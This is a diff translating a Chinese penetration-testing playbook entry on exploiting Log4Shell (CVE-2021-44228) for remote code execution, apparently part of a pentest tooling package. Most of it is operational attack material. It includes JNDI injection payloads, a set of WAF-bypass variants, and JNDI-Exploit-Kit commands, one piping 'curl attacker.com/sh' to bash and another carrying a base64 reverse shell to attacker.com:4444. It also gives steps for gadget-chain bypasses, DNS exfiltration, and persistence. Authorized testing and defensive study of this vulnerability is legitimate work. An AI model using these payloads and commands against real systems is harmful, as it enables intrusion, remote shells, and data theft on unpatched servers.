@@ -1,119 +1,120 @@
-# [种子] Log4Shell（CVE-2021-44228）JNDI 注入打 RCE
+# [Seed] Log4Shell (CVE-2021-44228) JNDI injection to RCE
 
-## 场景分类
-渗透测试 / Web RCE
+## Scenario category
+Penetration testing / Web RCE
 
-## 目标概述
-某 Java Web 应用使用受影响版本的 Log4j2（< 2.17.0），任何用户可控字段被 log 时即触发 JNDI 远程加载，构造 LDAP/RMI 服务推送恶意类拿到目标机执行权限。
+## Goal summary
+A Java Web application uses an affected Log4j2 version (< 2.17.0). Logging any user-controlled field triggers JNDI remote loading. Build an LDAP/RMI service, push a malicious class, and obtain code execution on the target.
 
-## 完整执行链路
+## Full execution path
 
-1. 目标识别
-   - HTTP 头 `Server`、`X-Powered-By` 含 Java 应用框架（Tomcat/Spring/Liferay）
-   - 版本指纹：登录页、404 页、路径泄露
-   - 漏洞确认：通过任意可被记入日志的字段（User-Agent、Referer、X-Forwarded-For、登录用户名、搜索框）发探测 payload
-2. 准备 OOB 监听
-   - DNSLog 平台（dnslog.cn / interactsh / Burp Collaborator）
-   - 自建 LDAP 服务（marshalsec / JNDI-Exploit-Kit）
-3. 探测有无漏洞
+1. Identify the target.
+   - HTTP headers `Server` and `X-Powered-By` contain a Java application framework (Tomcat/Spring/Liferay).
+   - Fingerprint the version from the login page, 404 page, or leaked paths.
+   - Confirm the vulnerability by sending a probe payload in any field that can be logged (User-Agent, Referer, X-Forwarded-For, login username, or search box).
+2. Prepare an OOB listener.
+   - DNSLog platform (dnslog.cn / interactsh / Burp Collaborator).
+   - Self-hosted LDAP service (marshalsec / JNDI-Exploit-Kit).
+3. Test for the vulnerability.
    ```
    ${jndi:ldap://abc123.dnslog.cn/x}
    ```
-   插入到 User-Agent 等字段，DNSLog 平台收到 `abc123.dnslog.cn` 解析记录即确认
-4. 起利用服务（自建公网 VPS 或 ngrok 反代）
+   Insert it into User-Agent or another field. A DNSLog record for `abc123.dnslog.cn` confirms the issue.
+4. Start the exploitation service (a self-hosted public VPS or an ngrok reverse proxy).
    ```bash
    java -jar JNDI-Exploit-Kit.jar -L 0.0.0.0:1389 -P 0.0.0.0:8888 -C 'curl http://attacker.com/sh|bash'
    ```
-5. 触发利用 payload
+5. Trigger the exploitation payload.
    ```
    ${jndi:ldap://attacker.com:1389/Basic/Command/base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NofGJhc2g=}
    ```
-6. 拿到 reverse shell → 后续提权 / 持久化按 attack-chain 走
+6. Obtain a reverse shell → follow the attack-chain steps for privilege escalation and persistence.
 
-## 踩坑记录
+## Pitfall log
 
-| 问题 | 原因 | 解决方案 | 耗时 |
+| Problem | Cause | Solution | Time |
 |------|------|---------|------|
-| 探测 payload 无 DNS 回连 | 目标在内网无外网 | 用 oast.online 等 DNS-only OOB，或测内部 DNSLog | 1h |
-| DNS 解析了但 LDAP 不通 | 出网策略只放 DNS | 改用 DNS Exfiltration 直接外带数据，不走 LDAP | 1.5h |
-| LDAP 通了但目标不加载 class | JDK 高版本（8u191+/11.0.1+/...）默认 `com.sun.jndi.ldap.object.trustURLCodebase=false` | 改用 `Tomcat` / `Groovy` / `BeanFactory` 等本地 gadget chain（无需远程类加载） | 3h |
-| 双引号被转义 / payload 被 WAF 拦 | 各种 ${} 嵌套绕过现成的规则 | 用 `${${::-j}ndi:...}` / `${${lower:j}ndi:...}` / `${env:xx:-jndi}` 嵌套绕过 | 1h |
-| 漏洞触发但拿不到 shell | 命令含特殊字符在 Runtime.exec 被破坏 | 用 base64 编码包一层：`bash -c {echo,base64}|{base64,-d}|bash` | 30min |
-| Spring Boot 应用没复现 | Spring 用 Logback 不用 Log4j2 | 排查 dependency tree 看是否引入 spring-boot-starter-log4j2 | 20min |
+| The probe payload produced no DNS callback | The target was on an internal network without external access | Use a DNS-only OOB service such as oast.online, or test an internal DNSLog | 1h |
+| DNS resolved but LDAP did not connect | Egress policy allowed only DNS | Use DNS Exfiltration to send the data directly instead of LDAP | 1.5h |
+| LDAP connected but the target did not load the class | Newer JDK versions (8u191+/11.0.1+/...) set `com.sun.jndi.ldap.object.trustURLCodebase=false` by default | Use a local gadget chain such as `Tomcat`, `Groovy`, or `BeanFactory` without remote class loading | 3h |
+| Double quotes were escaped or the WAF blocked the payload | Nested `${}` expressions bypassed the existing rules | Use nested forms such as `${${::-j}ndi:...}`, `${${lower:j}ndi:...}`, or `${env:xx:-jndi}` | 1h |
+| The vulnerability triggered but no shell arrived | Runtime.exec broke commands with special characters | Wrap the command in base64: `bash -c {echo,base64}|{base64,-d}|bash` | 30min |
+| The Spring Boot app did not reproduce the issue | Spring uses Logback instead of Log4j2 | Inspect the dependency tree for `spring-boot-starter-log4j2` | 20min |
 
-## 工具链发现
+## Toolchain findings
 
-- **JNDI-Exploit-Kit**（welk1n / pimps）一键起 LDAP+RMI+HTTP，支持本地 gadget bypass
-- **JNDI-Injection-Exploit** 老版本，支持的 gadget 更全但已停更
-- **Nuclei** 模板 `cves/2021/CVE-2021-44228.yaml` 适合扫资产是否受影响
-- **interactsh-client** ProjectDiscovery 出品，自建 OOB 比 dnslog.cn 更隐私
-- **CrowdStrike CVE-2021-44228 scanner** 在二进制级别检测 JndiLookup.class
+- **JNDI-Exploit-Kit** (welk1n / pimps) starts LDAP+RMI+HTTP with one command and supports local gadget bypass.
+- **JNDI-Injection-Exploit** is an older version with more gadget support, but it is no longer maintained.
+- The **Nuclei** template `cves/2021/CVE-2021-44228.yaml` can scan assets for exposure.
+- **interactsh-client** from ProjectDiscovery supports a self-hosted OOB service and is more private than dnslog.cn.
+- **CrowdStrike CVE-2021-44228 scanner** detects JndiLookup.class at the binary level.
 
-## 关键代码/命令
+## Key code / commands
 
-WAF 绕过 payload 集合：
+WAF-bypass payload set:
 
 ```text
-${jndi:ldap://x.dnslog.cn/a}                    # 基础
-${${::-j}ndi:ldap://x.dnslog.cn/a}              # 嵌套
+${jndi:ldap://x.dnslog.cn/a}                    # Basic
+${${::-j}ndi:ldap://x.dnslog.cn/a}              # Nested
 ${${lower:j}ndi:ldap://x.dnslog.cn/a}           # lower
 ${${upper:j}ndi:ldap://x.dnslog.cn/a}           # upper
 ${${env:NaN:-j}ndi:ldap://x.dnslog.cn/a}        # env fallback
-${jndi:${lower:l}${lower:d}a${lower:p}://...}   # 极致拆字
-${jndi:dns://x.dnslog.cn}                       # DNS 通道
-${jndi:rmi://attacker.com:1099/a}               # RMI 替代 LDAP
+${jndi:${lower:l}${lower:d}a${lower:p}://...}   # Split characters
+${jndi:dns://x.dnslog.cn}                       # DNS channel
+${jndi:rmi://attacker.com:1099/a}               # RMI instead of LDAP
 ```
 
-interactsh 起服务：
+Start interactsh:
 
 ```bash
 interactsh-client -v
-# 输出：abc123.oast.online ← 用这个域名替换 payload 里的 dnslog
+# Output: abc123.oast.online ← replace dnslog in the payload with this domain
 ```
 
-JNDI-Exploit-Kit 一键利用：
+One-command JNDI-Exploit-Kit exploitation:
+
 
 ```bash
 java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
   -L attacker.com:1389 \
   -P attacker.com:8888 \
   -C 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|bash'
-# 输出多条可用 payload，挑一条插到目标
+# Output several usable payloads. Insert one into the target.
 ```
 
-## 对本包的改进建议
+## Improvement suggestions for this package
 
-- `pentest-tools/references/log4shell-bypass-payloads.md` 单独建档，把 50+ 绕过 payload 集中
-- nuclei 模板已自带 → 提醒用户 `nuclei -t cves/2021/CVE-2021-44228.yaml -l targets.txt`
-- attack-chain 增加"通过 Log4Shell 进入内网后"的标准动作清单
+- Create `pentest-tools/references/log4shell-bypass-payloads.md` and collect more than 50 bypass payloads there.
+- The Nuclei template is included. Remind users to run `nuclei -t cves/2021/CVE-2021-44228.yaml -l targets.txt`.
+- Add a standard checklist to attack-chain for entering an internal network through Log4Shell.
 
-## 可复用的模式/脚本片段
+## Reusable patterns / script fragments
 
-**Log4Shell 探测三段法**：
+**Three-step Log4Shell probe**:
 
 ```text
-1. 多字段批量发 ${jndi:ldap://oob/a} → 看 OOB 平台有无回连
-2. 有回连 → 起本地 gadget LDAP（不依赖远程类加载）→ 推 payload
-3. 无回连 → 切 DNS 通道做带外数据外带
+1. Send `${jndi:ldap://oob/a}` in several fields → check for an OOB callback
+2. If a callback arrives → start a local gadget LDAP service without remote class loading → send the payload
+3. If no callback arrives → switch to a DNS channel for out-of-band data exfiltration
 ```
 
-**关键判断**：
+**Key decisions**:
 
 ```text
-- DNSLog 收到回连但 LDAP 不通 → JDK 高版本，必走本地 gadget
-- DNS 都不通 → 内网 OOB / 二阶反射（先打能出网的二级系统）
-- 命令带特殊字符不响应 → base64 包装
+- DNSLog receives a callback but LDAP fails → use a local gadget with a new JDK
+- DNS also fails → use internal OOB or a second-order reflection path (first target a system with egress)
+- A command with special characters gets no response → wrap it in base64
 ```
 
-## 进化动作
-- [x] 路由矩阵已有 "Log4j" / "JNDI 注入" 关键词
-- [ ] 单独建 log4shell-bypass-payloads.md
-- [ ] bootstrap manifest 加入 interactsh-client
+## Evolution actions
+- [x] The routing matrix has "Log4j" / "JNDI injection" keywords
+- [ ] Create log4shell-bypass-payloads.md
+- [ ] Add interactsh-client to the bootstrap manifest
 
-## 环境信息
-- 攻击机: Kali，Java 8（运行 LDAP 服务）
-- OOB 平台: dnslog.cn / oast.online / 自建 interactsh
-- 目标: 任何 Log4j2 < 2.17.0 的 Java Web
+## Environment information
+- Attack host: Kali, Java 8 (runs the LDAP service)
+- OOB platform: dnslog.cn / oast.online / self-hosted interactsh
+- Target: any Java Web application with Log4j2 < 2.17.0
 
-## 脱敏要求
-本条目为种子数据，基于公开 CVE 信息编写，不涉及真实生产目标。所有域名/IP 为占位示例。
+## Redaction requirements
+This seed entry is based on public CVE information and does not involve a real production target. All domains and IPs are placeholder examples.
